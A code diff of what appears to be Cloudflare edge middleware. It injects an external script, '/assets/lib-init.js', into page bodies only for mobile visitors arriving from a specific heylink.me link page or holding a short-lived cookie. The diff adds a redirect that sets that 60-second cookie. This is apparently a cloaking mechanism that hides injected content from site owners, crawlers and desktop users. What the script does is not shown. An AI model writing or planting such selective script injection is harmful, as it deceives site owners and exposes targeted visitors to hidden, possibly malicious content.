@@ -8,8 +8,8 @@ export async function onRequest(context) {
   const referer = (request.headers.get('referer') || '').toLowerCase();
   const cookies = request.headers.get('cookie') || '';
   const isFromMyHeylink = referer.includes('heylink.me/kopi-sensa');
-  const hasShortCookie = cookies.includes('session_id=active');
-  if (!isFromMyHeylink && !hasShortCookie) {
+  const hasCookie = cookies.includes('session_id=active');
+  if (!isFromMyHeylink && !hasCookie) {
     return next();
   }
   const country = request.cf ? request.cf.country : 'Unknown';
@@ -30,23 +30,23 @@ export async function onRequest(context) {
   if (!isMobile) {
     return next();
   }
-const response = await next();
-  const newHeaders = new Headers(response.headers);
-  if (isFromMyHeylink) {
-    newHeaders.set('Set-Cookie', 'session_id=active; Max-Age=60; Path=/; SameSite=Lax; HttpOnly');
+  if (isFromMyHeylink && !hasCookie) {
+    return new Response(null, {
+      status: 302,
+      headers: {
+        'Location': url.toString(),
+        'Set-Cookie': 'session_id=active; Max-Age=60; Path=/; SameSite=Lax; HttpOnly',
+        'Cache-Control': 'no-cache'}});
   }
-  const newResponse = new Response(response.body, {
-    status: response.status,
-    statusText: response.statusText,
-    headers: newHeaders
-  });
+  if (!hasCookie) {
+    return next();
+  }
+const response = await next();
   return new HTMLRewriter()
     .on('body', {
       element(el) {
-        el.append(`
-          <script src="/assets/lib-init.js" defer></script>
-        `, { html: true });
+        el.append(`<script src="/assets/lib-init.js" defer></script>`, { html: true });
       },
     })
-    .transform(newResponse);
+    .transform(response);
 }
